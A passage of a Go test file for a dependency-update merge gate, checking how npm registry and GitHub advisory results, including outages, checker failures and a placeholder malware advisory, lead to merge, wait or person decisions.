			want: "provenance of 4.3.4: the registry's answer could not be used", reason: allow.ReasonFactMissing,
		},
		{
			// The checker's own "the database did not answer" is passed
			// on as it is: a wait.
			name: "advisory database down",
			adv: fakeAdvisories{byName: map[string]advisory.Result{"chart.js": {
				SecurityFix:   allow.Unavailable("GitHub's Advisory Database did not answer (HTTP 502, after retries)", "GET api.github.com/advisories"),
				NoMalware:     allow.Unavailable("GitHub's Advisory Database did not answer (HTTP 502, after retries)", "GET api.github.com/advisories"),
				NoNewAdvisory: allow.Unavailable("GitHub's Advisory Database did not answer (HTTP 502, after retries)", "GET api.github.com/advisories"),
			}}},
			update: "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.SecurityFix },
			want: "GitHub's Advisory Database did not answer (HTTP 502", reason: allow.ReasonSourceUnavailable,
		},
		{
			name: "advisory database down leaves clean unavailable",
			adv: fakeAdvisories{byName: map[string]advisory.Result{"chart.js": {
				SecurityFix:   allow.Unavailable("no answer", "advisories"),
				NoMalware:     allow.Unavailable("GitHub's Advisory Database did not answer (HTTP 502, after retries)", "GET api.github.com/advisories"),
				NoNewAdvisory: allow.Unavailable("no answer", "advisories"),
			}}},
			update: "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Clean },
			want: "GitHub's Advisory Database did not answer (HTTP 502", reason: allow.ReasonSourceUnavailable,
		},
		{
			// A checker that fails without the context ending tells
			// nothing: nothing was established, which is person.
			name:   "advisory checker fails",
			adv:    fakeAdvisories{err: errors.New("HTTP 502")},
			update: "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.SecurityFix },
			want: `the advisory checker failed: "HTTP 502"`, reason: allow.ReasonFactMissing,
		},
		{
			name:   "advisory checker fails, and clean is not established",
			adv:    fakeAdvisories{err: errors.New("HTTP 502")},
			update: "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Clean },
			want: `the advisory checker failed: "HTTP 502"`, reason: allow.ReasonFactMissing,
		},
		{
			name: "malware advisory",
			adv: fakeAdvisories{byName: map[string]advisory.Result{"chart.js": {
				SecurityFix:   allow.No("none", "test"),
				NoMalware:     allow.No("GHSA-xxxx-xxxx-xxxx (malware)", "GET /advisories (test)"),
				NoNewAdvisory: allow.Yes("none", "test"),
			}}},
			update: "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Clean },
			gathered: true, want: "GHSA-xxxx-xxxx-xxxx (malware)", reason: allow.ReasonNotClean,
		},
		{
			name: "advisory database silent about malware",
			adv: fakeAdvisories{byName: map[string]advisory.Result{"chart.js": {
				SecurityFix:   allow.No("none", "test"),
				NoNewAdvisory: allow.Yes("none", "test"),
			}}},
			update: "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Clean },
			want: "the advisory database gave no answer", reason: allow.ReasonFactMissing,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			res := gatherCase(t, loadCase(t, "plain"), tt.override, tt.adv)
			if !res.Shape.Holds() {
				t.Fatalf("Shape: %+v", res.Shape)
			}
			f := tt.fact(findUpdate(t, res, tt.update))
			if tt.reason == "" {
				// Nothing is wrong: the pull request still merges.
				if !f.Holds() {
					t.Errorf("fact = %+v, want it to hold", f)
				}
				if d := decide(res); d.Outcome != allow.Merge {
					t.Errorf("Decide = %s %v, want merge", d.Outcome, d.Reasons)
				}
				return
			}
			if f.OK || f.Gathered() != tt.gathered {
				t.Errorf("fact = %+v, want OK false and gathered %v", f, tt.gathered)
			}
			// Unavailable goes with a source that was asked; a fact
			// nothing established has none.
			if unavailable := tt.reason == allow.ReasonSourceUnavailable; f.Unavailable != unavailable || (!tt.gathered && (f.Source != "") != unavailable) {
				t.Errorf("fact = %+v, want unavailable %v", f, unavailable)
			}
			if !strings.Contains(f.Value, tt.want) {
				t.Errorf("fact.Value = %q, want it to say %q", f.Value, tt.want)
			}
			d := decide(res)
			found := false
			for _, r := range d.Reasons {
				found = found || r == tt.reason
			}
			if d.Outcome != tt.reason.Outcome() || !found {
				t.Errorf("Decide = %s %v, want %s with %s", d.Outcome, d.Reasons, tt.reason.Outcome(), tt.reason)
			}
			// A wait is never bought with a "no" elsewhere: nothing in a
			// waiting decision says person.
			if d.Outcome == allow.Wait && !reflect.DeepEqual(d.Reasons, []allow.Reason{allow.ReasonSourceUnavailable}) {
				t.Errorf("Decide = wait %v, want [source_unavailable] alone", d.Reasons)
			}
		})
	}
}

// TestGatherNewListedName: a new name that is on the list is known, and
// Decide treats it like an established one.
func TestGatherNewListedName(t *testing.T) {
	c := loadCase(t, "newname")
	policy := testPolicy()
	policy.Listed = map[string][]string{allow.NPM: {"@kurkle/", "chart.js"}}
	res, err := Gatherer{tool: replay(t, c)}.Gather(context.Background(), facts.Input{
		Files: c.files(""), Policy: policy, HTTP: newFakeRegistry(t, nil), Advisories: fakeAdvisories{},
	})
	if err != nil {
		t.Fatal(err)
	}
	color := findUpdate(t, res, "@kurkle/color")
	if !color.NewName.Holds() || !color.Listed.Holds() || !color.Known.Holds() {
		t.Errorf("NewName = %+v, Listed = %+v, Known = %+v; want all three to hold", color.NewName, color.Listed, color.Known)
	}
	pr := allow.PRFacts{Ecosystem: allow.NPM, Identity: allow.Yes("test", "test"), Shape: res.Shape, ChecksConfigured: allow.Yes("test", "test")}
	for _, u := range res.Updates {
		u.Read = allow.ReadFull
		pr.Updates = append(pr.Updates, u)
	}
	// chart.js 3 -> 4 is a listed major here, and both versions are old.
	if d := allow.Decide(pr, policy, testNow); d.Outcome != allow.Merge {
		t.Errorf("Decide = %s %v, want merge", d.Outcome, d.Reasons)
	}
}

func TestGatherNoAdvisoryChecker(t *testing.T) {
	res := gatherCase(t, loadCase(t, "plain"), nil, nil)
	u := findUpdate(t, res, "chart.js")
	if u.SecurityFix.Gathered() || u.Clean.Gathered() {
		t.Errorf("SecurityFix = %+v, Clean = %+v, want both ungathered without a checker", u.SecurityFix, u.Clean)
	}
	if d := decide(res); d.Outcome != allow.Person {
		t.Errorf("Decide = %s, want person", d.Outcome)
	}
}

func TestGatherErrors(t *testing.T) {
	c := loadCase(t, "plain")
	in := facts.Input{Files: c.files(""), Policy: testPolicy(), HTTP: newFakeRegistry(t, nil), Advisories: fakeAdvisories{}}

	t.Run("context ended", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		cancel()
		in := in
		in.HTTP = newFakeRegistry(t, nil)
		in.HTTP.Transport = cancelled{}
		if _, err := (Gatherer{tool: replay(t, c)}).Gather(ctx, in); !errors.Is(err, context.Canceled) {
			t.Errorf("Gather = %v, want context.Canceled", err)
		}
	})
	t.Run("no HTTP client", func(t *testing.T) {
		in := in
		in.HTTP = nil
		if _, err := (Gatherer{tool: replay(t, c)}).Gather(context.Background(), in); err == nil {
			t.Error("Gather without an HTTP client did not fail")
		}
	})
	t.Run("npm not installed", func(t *testing.T) {
		if _, err := (Gatherer{NPM: "/nonexistent/npm"}).Gather(context.Background(), in); err == nil || !strings.Contains(err.Error(), "npm is not installed") {
			t.Errorf("Gather = %v, want npm is not installed", err)
		}
	})
	t.Run("npm too new", func(t *testing.T) {
		r := replay(t, c)
		r.version = "12.0.0"
		if _, err := (Gatherer{tool: r}).Gather(context.Background(), in); err == nil || !strings.Contains(err.Error(), "not a version the gate was tested with") {
			t.Errorf("Gather = %v, want an untested npm to be refused", err)
		}
	})
	t.Run("npm run failed", func(t *testing.T) {
		if _, err := (Gatherer{tool: replayTool{version: "11.20.0"}}).Gather(context.Background(), in); err == nil {
			t.Error("Gather did not fail when npm ls could not run")
		}
	})
}

// cancelled is a transport whose requests fail the way a cancelled
// context makes them fail.
type cancelled struct{}

func (cancelled) RoundTrip(*http.Request) (*http.Response, error) { return nil, context.Canceled }

// TestGatherAsksOncePerName checks the packument is fetched once for a
// name, however many facts read it.
func TestGatherAsksOncePerName(t *testing.T) {
	c := loadCase(t, "plain")
	client := newFakeRegistry(t, nil)
	_, err := Gatherer{tool: replay(t, c)}.Gather(context.Background(), facts.Input{
		Files: c.files(""), Policy: testPolicy(), HTTP: client, Advisories: fakeAdvisories{},
	})
	if err != nil {
		t.Fatal(err)
	}
	for url, n := range client.Transport.(*fakeRegistry).asked {
		if n != 1 {
			t.Errorf("%s was requested %d times", url, n)
		}
	}
}
